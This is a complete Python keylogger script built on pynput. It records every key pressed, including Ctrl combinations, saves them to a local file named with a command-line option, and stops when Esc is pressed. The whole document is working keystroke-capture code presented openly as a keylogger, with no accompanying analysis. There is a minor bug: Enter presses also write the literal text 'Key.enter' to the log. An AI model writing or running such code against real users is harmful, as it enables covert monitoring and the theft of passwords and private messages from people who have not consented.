from pynput.keyboard import Listener, Key
import argparse

# creating an empty list to store pressed keys
keys = []

not_to_be_printed = [Key.shift, Key.ctrl, Key.alt, Key.cmd, Key.esc]
ctrl_pressed = False  # Variable to track if Ctrl is pressed
output_file = 'keylog.txt'  # Default output file

# creating a function that defines what to do on each key press
def keyPress(key):
    global ctrl_pressed
    if key == Key.ctrl:
        ctrl_pressed = True
    elif ctrl_pressed:
        keys.append(f'Ctrl+{key}')
        ctrl_pressed = False
    else:
        keys.append(key)
    storeKeysToFile(keys)


# defining the function to perform operation on each key release
def keyRelease(key):
    if key == Key.esc:
        return False

# defining the function to write keys to the log file
def storeKeysToFile(keys):
    with open(output_file, 'w') as log:
        for the_key in keys:
            if the_key in not_to_be_printed:
                continue
            if the_key == Key.space:
                log.write(' ')
                continue
            if the_key == Key.backspace:
                log.write('\b')
                continue
            if the_key == Key.enter:
                log.write('\n')

            the_key = str(the_key).replace("'", "")
            log.write(the_key)

# Your other functions that use output_file can access it as a global variable

def main():
    global output_file  # Make it global
    parser = argparse.ArgumentParser(description='Keylogger with output file option')
    parser.add_argument('-o', '--output', metavar='output_file', default='keylog.txt',
                        help='Specify the output file name (default: keylog.txt)')
    args = parser.parse_args()

    # Check if the -o option has been provided, set output_file accordingly
    output_file = args.output

    with Listener(
            on_press=keyPress,
            on_release=keyRelease
    ) as the_listener:
        the_listener.join()


if __name__ == "__main__":
    main()